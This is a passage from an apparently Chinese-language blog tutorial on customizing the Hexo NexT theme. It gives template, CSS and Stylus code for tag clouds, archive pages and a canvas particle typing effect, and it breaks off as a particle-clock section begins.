tags[i].style.background = &quot;rgb(&quot;+r+&quot;,&quot;+g+&quot;,&quot;+b+&quot;)&quot;;</span><br><span class="line">     &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">  .tag-cloud-tags&#123;</span><br><span class="line">    /*font-family: Helvetica, Tahoma, Arial;*/</span><br><span class="line">    /*font-weight: 100;*/</span><br><span class="line">    text-align: center;</span><br><span class="line">    counter-reset: tags;</span><br><span class="line">  &#125;</span><br><span class="line">  .tag-cloud-tags a&#123;</span><br><span class="line">    border-radius: 6px;</span><br><span class="line">    padding-right: 5px;</span><br><span class="line">    padding-left: 5px;</span><br><span class="line">    margin: 8px 5px 0px 0px;</span><br><span class="line">  &#125;</span><br><span class="line">  .tag-cloud-tags a:before&#123;</span><br><span class="line">    content: &quot;🔖&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .tag-cloud-tags a:hover&#123;</span><br><span class="line">     box-shadow: 0px 5px 15px 0px rgba(0,0,0,.4);</span><br><span class="line">     transform: scale(1.1);</span><br><span class="line">     /*box-shadow: 10px 10px 15px 2px rgba(0,0,0,.12), 0 0 6px 0 rgba(104, 104, 105, 0.1);*/</span><br><span class="line">     transition-duration: 0.15s;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p> 在同级目录的<code>page.swig</code>中引入<code>tag-color.swig</code>： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    &lt;div class=&quot;tag-cloud&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 目前共计xxx个标签</span><br><span class="line">        &lt;div class=&quot;tag-cloud-title&quot;&gt;</span><br><span class="line">            &#123;&#123; _p(&apos;counter.tag_cloud&apos;, site.tags.length) &#125;&#125;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        --&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;div class=&quot;tag-cloud-tags&quot;&gt;</span><br><span class="line">          &#123;&#123; tagcloud(&#123;min_font: 10, max_font: 15, amount: 300, color: true, start_color: &apos;#ccc&apos;, end_color: &apos;#111&apos;&#125;) &#125;&#125;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    </span><br><span class="line">+     &#123;% include &apos;tag-color.swig&apos; %&#125;</span><br><span class="line">    </span><br><span class="line">    &#123;% elif page.type === &apos;categories&apos; %&#125;</span><br><span class="line">      &lt;div class=&quot;category-all-page&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;category-all-title&quot;&gt;</span><br><span class="line">            &#123;&#123; _p(&apos;counter.categories&apos;, site.categories.length) &#125;&#125;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;category-all&quot;&gt;</span><br><span class="line">          &#123;&#123; list_categories() &#125;&#125;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="文章底部的标签样式"><a href="#文章底部的标签样式" class="headerlink" title="文章底部的标签样式"></a>文章底部的标签样式</h3><p> 代码拷入<code>/themes/next/source/css/_custom/custom.styl</code>即可 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/*文章底部标签样式*/</span><br><span class="line">.posts-expand .post-tags a &#123;</span><br><span class="line">  -webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, .12), 0 1px 2px rgba(0, 0, 0, .24);</span><br><span class="line">  -moz-box-shadow: 0 1px 3px rgba(0, 0, 0, .12), 0 1px 2px rgba(0, 0, 0, .24);</span><br><span class="line">  box-shadow: 0 1px 3px rgba(0, 0, 0, .12), 0 1px 2px rgba(0, 0, 0, .24);</span><br><span class="line">  font-family: &apos;Comic Sans MS&apos;, sans-serif;</span><br><span class="line">  transition: .2s ease-out;</span><br><span class="line">  padding: 3px 5px;</span><br><span class="line">  margin: 5px;</span><br><span class="line">  background: #f5f5f5;</span><br><span class="line">  border-bottom: none;</span><br><span class="line">  border-radius: 15px;</span><br><span class="line"></span><br><span class="line">  +mobile()&#123;</span><br><span class="line">    padding: 1px 3px;</span><br><span class="line">    font-size: 8px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    background: rgba(100,154,182,0.902);</span><br><span class="line">    color: #fff;</span><br><span class="line">    -webkit-box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);</span><br><span class="line">    -moz-box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);</span><br><span class="line">    box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="归档页美化"><a href="#归档页美化" class="headerlink" title="归档页美化"></a>归档页美化</h2><ol><li>修改<code>/themes/next/layout/_macro/post-collapse.swig</code>后的代码如下 </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#123;% macro render(post) %&#125;</span><br><span class="line"></span><br><span class="line">  &lt;article class=&quot;my-post post-type-&#123;&#123; post.type | default(&apos;normal&apos;) &#125;&#125;&quot; itemscope itemtype=&quot;http://schema.org/Article&quot;&gt;</span><br><span class="line">    &lt;header class=&quot;my-post-header&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class=&quot;my-post-meta&quot;&gt;</span><br><span class="line">        &lt;time class=&quot;my-post-time&quot; itemprop=&quot;dateCreated&quot;</span><br><span class="line">              datetime=&quot;&#123;&#123; moment(post.date).format() &#125;&#125;&quot;</span><br><span class="line">              content=&quot;&#123;&#123; date(post.date, config.date_format) &#125;&#125;&quot; &gt;</span><br><span class="line">          &#123;&#123; date(post.date, &apos;MM-DD&apos;) &#125;&#125;</span><br><span class="line">        &lt;/time&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;&#123;% if theme.seo %&#125;h3&#123;% else %&#125;h2&#123;% endif %&#125; class=&quot;my-post-title&quot;&gt;</span><br><span class="line">        &#123;% if post.link %&#125;&#123;# Link posts #&#125;</span><br><span class="line">          &lt;a class=&quot;my-post-title-link post-title-link-external&quot; target=&quot;_blank&quot; href=&quot;&#123;&#123; url_for(post.link) &#125;&#125;&quot; itemprop=&quot;url&quot;&gt;</span><br><span class="line">            &#123;&#123; post.title or post.link &#125;&#125;</span><br><span class="line">            &lt;i class=&quot;fa fa-external-link&quot;&gt;&lt;/i&gt;</span><br><span class="line">          &lt;/a&gt;</span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">            &lt;a class=&quot;my-post-title-link&quot; href=&quot;&#123;&#123; url_for(post.path) &#125;&#125;&quot; itemprop=&quot;url&quot;&gt;</span><br><span class="line">              &#123;% if post.type === &apos;picture&apos; %&#125;</span><br><span class="line">                &#123;&#123; post.content &#125;&#125;</span><br><span class="line">              &#123;% else %&#125;</span><br><span class="line">                &lt;span itemprop=&quot;name&quot;&gt;&#123;&#123; post.title | default(__(&apos;post.untitled&apos;)) &#125;&#125;&lt;/span&gt;</span><br><span class="line">              &#123;% endif %&#125;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">      &lt;/&#123;% if theme.seo %&#125;h3&#123;% else %&#125;h2&#123;% endif %&#125;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/header&gt;</span><br><span class="line">  &lt;/article&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endmacro %&#125;</span><br></pre></td></tr></table></figure><p>主要修改：一是将<code>post-meta</code>这个div移到前面header标签下；二是将所有的class属性都加上<code>my-</code>，例如<code>my-post-meta</code>，这样改动是为了不影响其它页面引用的样式。</p><p>2.在<code>/themes/next/source/css/_custom/custom.styl</code>新增如下样式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">/* 归档页样式 began */</span><br><span class="line">.page-archive .archive-page-counter &#123;</span><br><span class="line">  font-size: 18px;</span><br><span class="line">  background-color: #49b1f5;</span><br><span class="line">  padding-left: 10px;</span><br><span class="line">  padding-right: 10px;</span><br><span class="line">  border-radius: 8px;</span><br><span class="line">  color: #fff;</span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    font-size: 16px;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">.my-post-time&#123;</span><br><span class="line">  font-size: 11px;</span><br><span class="line">  position: absolute;</span><br><span class="line">  color: #fff;</span><br><span class="line">  background-color: #49b1f5;</span><br><span class="line">  border-radius: 5px;</span><br><span class="line">  padding-left: 5px;</span><br><span class="line">  padding-right: 5px;</span><br><span class="line">  margin-left: 15px;</span><br><span class="line">&#125;</span><br><span class="line">.mypost&#123;</span><br><span class="line">  position: relative;</span><br><span class="line">  margin-bottom: 1rem;</span><br><span class="line">  -webkit-transition: all .2s ease-in-out;</span><br><span class="line">  -moz-transition: all .2s ease-in-out;</span><br><span class="line">  -o-transition: all .2s ease-in-out;</span><br><span class="line">  -ms-transition: all .2s ease-in-out;</span><br><span class="line">  transition: all .2s ease-in-out;</span><br><span class="line">&#125;</span><br><span class="line">a.my-post-title-link:before&#123;</span><br><span class="line">  top: 10px;</span><br><span class="line">  width: 18px;</span><br><span class="line">  height: 18px;</span><br><span class="line">  content: &quot;📚&quot;;</span><br><span class="line">  margin-right: 5px;</span><br><span class="line">  font: normal normal normal 14px/1 FontAwesome;</span><br><span class="line">  font-size: 15px;</span><br><span class="line">  line-height: 18px;</span><br><span class="line">&#125;</span><br><span class="line">.my-post:hover&#123;</span><br><span class="line">  transform: scale(1.1);</span><br><span class="line">  box-shadow: 10px 10px 15px 2px rgba(0,0,0,.12), 0 0 6px 0 rgba(104, 104, 105, 0.1);</span><br><span class="line">  border-radius: 30px;</span><br><span class="line">  width: 400px;</span><br><span class="line">  padding: 1px 10px;</span><br><span class="line">  margin-left: 25px;</span><br><span class="line">  font-size: 16px;</span><br><span class="line">  transition-duration: 0.15s;</span><br><span class="line">  +mobile()&#123;</span><br><span class="line">    width: 260px;</span><br><span class="line">    margin-left: 18px;</span><br><span class="line">  &#125;</span><br><span class="line">  //display:flex;</span><br><span class="line">&#125;</span><br><span class="line">a.my-post-title-link&#123;</span><br><span class="line">  text-decoration: none;</span><br><span class="line">  font-size: 15px;</span><br><span class="line">  font-weight: 400;</span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">.my-post-title&#123;</span><br><span class="line">  display: block;</span><br><span class="line">  margin-left: 4.5rem;</span><br><span class="line">  color: #4c4948;</span><br><span class="line">  text-decoration: none;</span><br><span class="line">  font-size: .8rem;</span><br><span class="line">  cursor: pointer;</span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    //margin-left: 4rem;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">.my-post-header&#123;</span><br><span class="line">  position: top;</span><br><span class="line">  margin-bottom: 1rem;</span><br><span class="line">  -webkit-transition: all .2s ease-in-out;</span><br><span class="line">  -moz-transition: all .2s ease-in-out;</span><br><span class="line">  -o-transition: all .2s ease-in-out;</span><br><span class="line">  -ms-transition: all .2s ease-in-out;</span><br><span class="line">  transition: all .2s ease-in-out;</span><br><span class="line">&#125;</span><br><span class="line">//.my-post-title-link&#123;</span><br><span class="line">//  font-size: 16px;</span><br><span class="line">//  font-weight: 500;</span><br><span class="line">//&#125;</span><br><span class="line">.my-post-meta&#123;</span><br><span class="line">  position: absolute;</span><br><span class="line">  color: #99a9bf;</span><br><span class="line">  width: 80px;</span><br><span class="line">  color: #114142;</span><br><span class="line">&#125;</span><br><span class="line">div.post-block.tag .collection-title h2 &#123;</span><br><span class="line">  border-width: 1px;</span><br><span class="line">  border-style: solid;</span><br><span class="line">  border-color: #3f3f3f;</span><br><span class="line">  border-radius: 20px;</span><br><span class="line">  font-size: 22px;</span><br><span class="line">  background-color: #b4e8fa;</span><br><span class="line">  padding: 2px 15px;</span><br><span class="line">  letter-spacing: 1.5px;</span><br><span class="line">  box-sizing: border-box;</span><br><span class="line">  color: #3f3f3f;</span><br><span class="line">  display: inline-block;</span><br><span class="line">  margin: 10px 0 10px;</span><br><span class="line">  text-align: center;</span><br><span class="line">  +mobile()&#123;</span><br><span class="line">    font-size: 18px;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">.category-list-link:hover&#123;</span><br><span class="line">  transform: scale(1.1);</span><br><span class="line">  box-shadow: 10px 10px 15px 2px rgba(0,0,0,.12), 0 0 6px 0 rgba(104, 104, 105, 0.1);</span><br><span class="line">  border-radius: 8px;</span><br><span class="line">  padding: 1px 1px;</span><br><span class="line">  margin-left: 5px;</span><br><span class="line">  font-size: 16px;</span><br><span class="line">  transition-duration: 0.15s;</span><br><span class="line">  //display:flex;</span><br><span class="line">&#125;</span><br><span class="line">/* 归档页样式 end */</span><br></pre></td></tr></table></figure><h2 id="打字特效-（搜索框）"><a href="#打字特效-（搜索框）" class="headerlink" title="打字特效 （搜索框）"></a>打字特效 （搜索框）</h2><p> 此功能主要通过 <code>JS</code> 监听页面的 input 输入框事件来实现。首先在主题<code>_config.yml</code> 中添加动态配置项 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typing_effect:</span><br><span class="line">  enabled: true</span><br><span class="line">  colorful: true  # 礼花</span><br><span class="line">  shake: false  # 震动</span><br></pre></td></tr></table></figure><p> 在 <code>/themes/next/layout/_custom/header.swig</code> 中引入依赖 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if theme.typing_effect %&#125;</span><br><span class="line">  &lt;script src=&quot;/js/src/activate-power-mode.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    POWERMODE.colorful = &#123;&#123; theme.typing_effect.colorful &#125;&#125;;</span><br><span class="line">    POWERMODE.shake = &#123;&#123; theme.typing_effect.shake &#125;&#125;;</span><br><span class="line">    document.body.addEventListener(&apos;input&apos;, POWERMODE);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p> 其中的 <code>activate-power-mode.min.js</code> 位于<code>/themes/next/source/js/src/</code>目录，代码如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(function webpackUniversalModuleDefinition(root,factory)&#123;if(typeof exports===&apos;object&apos;&amp;&amp;typeof module===&apos;object&apos;)module.exports=factory();else if(typeof define===&apos;function&apos;&amp;&amp;define.amd)define([],factory);else if(typeof exports===&apos;object&apos;)exports[&quot;POWERMODE&quot;]=factory();else root[&quot;POWERMODE&quot;]=factory()&#125;)(this,function()&#123;return(function(modules)&#123;var installedModules=&#123;&#125;;function __webpack_require__(moduleId)&#123;if(installedModules[moduleId])return installedModules[moduleId].exports;var module=installedModules[moduleId]=&#123;exports:&#123;&#125;,id:moduleId,loaded:false&#125;;modules[moduleId].call(module.exports,module,module.exports,__webpack_require__);module.loaded=true;return module.exports&#125;__webpack_require__.m=modules;__webpack_require__.c=installedModules;__webpack_require__.p=&quot;&quot;;return __webpack_require__(0)&#125;)([function(module,exports,__webpack_require__)&#123;&apos;use strict&apos;;var canvas=document.createElement(&apos;canvas&apos;);canvas.width=window.innerWidth;canvas.height=window.innerHeight;canvas.style.cssText=&apos;position:fixed;top:0;left:0;pointer-events:none;z-index:999999&apos;;window.addEventListener(&apos;resize&apos;,function()&#123;canvas.width=window.innerWidth;canvas.height=window.innerHeight&#125;);document.body.appendChild(canvas);var context=canvas.getContext(&apos;2d&apos;);var particles=[];var particlePointer=0;POWERMODE.shake=true;function getRandom(min,max)&#123;return Math.random()*(max-min)+min&#125;function getColor(el)&#123;if(POWERMODE.colorful)&#123;var u=getRandom(0,360);return&apos;hsla(&apos;+getRandom(u-10,u+10)+&apos;, 100%, &apos;+getRandom(50,80)+&apos;%, &apos;+1+&apos;)&apos;&#125;else&#123;return window.getComputedStyle(el).color&#125;&#125;function getCaret()&#123;var el=document.activeElement;var bcr;if(el.tagName===&apos;TEXTAREA&apos;||(el.tagName===&apos;INPUT&apos;&amp;&amp;el.getAttribute(&apos;type&apos;)===&apos;text&apos;))&#123;var offset=__webpack_require__(1)(el,el.selectionStart);bcr=el.getBoundingClientRect();return&#123;x:offset.left+bcr.left,y:offset.top+bcr.top,color:getColor(el)&#125;&#125;var selection=window.getSelection();if(selection.rangeCount)&#123;var range=selection.getRangeAt(0);var startNode=range.startContainer;if(startNode.nodeType===document.TEXT_NODE)&#123;startNode=startNode.parentNode&#125;bcr=range.getBoundingClientRect();return&#123;x:bcr.left,y:bcr.top,color:getColor(startNode)&#125;&#125;return&#123;x:0,y:0,color:&apos;transparent&apos;&#125;&#125;function createParticle(x,y,color)&#123;return&#123;x:x,y:y,alpha:1,color:color,velocity:&#123;x:-1+Math.random()*2,y:-3.5+Math.random()*2&#125;&#125;&#125;function POWERMODE()&#123;&#123;var caret=getCaret();var numParticles=5+Math.round(Math.random()*10);while(numParticles--)&#123;particles[particlePointer]=createParticle(caret.x,caret.y,caret.color);particlePointer=(particlePointer+1)%500&#125;&#125;&#123;if(POWERMODE.shake)&#123;var intensity=1+2*Math.random();var x=intensity*(Math.random()&gt;0.5?-1:1);var y=intensity*(Math.random()&gt;0.5?-1:1);document.body.style.marginLeft=x+&apos;px&apos;;document.body.style.marginTop=y+&apos;px&apos;;setTimeout(function()&#123;document.body.style.marginLeft=&apos;&apos;;document.body.style.marginTop=&apos;&apos;&#125;,75)&#125;&#125;&#125;;POWERMODE.colorful=false;function loop()&#123;requestAnimationFrame(loop);context.clearRect(0,0,canvas.width,canvas.height);for(var i=0;i&lt;particles.length;++i)&#123;var particle=particles[i];if(particle.alpha&lt;=0.1)continue;particle.velocity.y+=0.075;particle.x+=particle.velocity.x;particle.y+=particle.velocity.y;particle.alpha*=0.96;context.globalAlpha=particle.alpha;context.fillStyle=particle.color;context.fillRect(Math.round(particle.x-1.5),Math.round(particle.y-1.5),3,3)&#125;&#125;requestAnimationFrame(loop);module.exports=POWERMODE&#125;,function(module,exports)&#123;(function()&#123;var properties=[&apos;direction&apos;,&apos;boxSizing&apos;,&apos;width&apos;,&apos;height&apos;,&apos;overflowX&apos;,&apos;overflowY&apos;,&apos;borderTopWidth&apos;,&apos;borderRightWidth&apos;,&apos;borderBottomWidth&apos;,&apos;borderLeftWidth&apos;,&apos;borderStyle&apos;,&apos;paddingTop&apos;,&apos;paddingRight&apos;,&apos;paddingBottom&apos;,&apos;paddingLeft&apos;,&apos;fontStyle&apos;,&apos;fontVariant&apos;,&apos;fontWeight&apos;,&apos;fontStretch&apos;,&apos;fontSize&apos;,&apos;fontSizeAdjust&apos;,&apos;lineHeight&apos;,&apos;fontFamily&apos;,&apos;textAlign&apos;,&apos;textTransform&apos;,&apos;textIndent&apos;,&apos;textDecoration&apos;,&apos;letterSpacing&apos;,&apos;wordSpacing&apos;,&apos;tabSize&apos;,&apos;MozTabSize&apos;];var isFirefox=window.mozInnerScreenX!=null;function getCaretCoordinates(element,position,options)&#123;var debug=options&amp;&amp;options.debug||false;if(debug)&#123;var el=document.querySelector(&apos;#input-textarea-caret-position-mirror-div&apos;);if(el)&#123;el.parentNode.removeChild(el)&#125;&#125;var div=document.createElement(&apos;div&apos;);div.id=&apos;input-textarea-caret-position-mirror-div&apos;;document.body.appendChild(div);var style=div.style;var computed=window.getComputedStyle?getComputedStyle(element):element.currentStyle;style.whiteSpace=&apos;pre-wrap&apos;;if(element.nodeName!==&apos;INPUT&apos;)style.wordWrap=&apos;break-word&apos;;style.position=&apos;absolute&apos;;if(!debug)style.visibility=&apos;hidden&apos;;properties.forEach(function(prop)&#123;style[prop]=computed[prop]&#125;);if(isFirefox)&#123;if(element.scrollHeight&gt;parseInt(computed.height))style.overflowY=&apos;scroll&apos;&#125;else&#123;style.overflow=&apos;hidden&apos;&#125;div.textContent=element.value.substring(0,position);if(element.nodeName===&apos;INPUT&apos;)div.textContent=div.textContent.replace(/\s/g,&quot;\u00a0&quot;);var span=document.createElement(&apos;span&apos;);span.textContent=element.value.substring(position)||&apos;.&apos;;div.appendChild(span);var coordinates=&#123;top:span.offsetTop+parseInt(computed[&apos;borderTopWidth&apos;]),left:span.offsetLeft+parseInt(computed[&apos;borderLeftWidth&apos;])&#125;;if(debug)&#123;span.style.backgroundColor=&apos;#aaa&apos;&#125;else&#123;document.body.removeChild(div)&#125;return coordinates&#125;if(typeof module!=&quot;undefined&quot;&amp;&amp;typeof module.exports!=&quot;undefined&quot;)&#123;module.exports=getCaretCoordinates&#125;else&#123;window.getCaretCoordinates=getCaretCoordinates&#125;&#125;())&#125;])&#125;);</span><br></pre></td></tr></table></figure><h2 id="canvas粒子时钟"><a href="#canvas粒子时钟" class="headerlink" title="canvas粒子时钟"></a>canvas粒子时钟</h2><p> 在<code>/themes/next/layout/_custom/</code>目录下，新建<code>clock.swig</code>文件，内容如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span 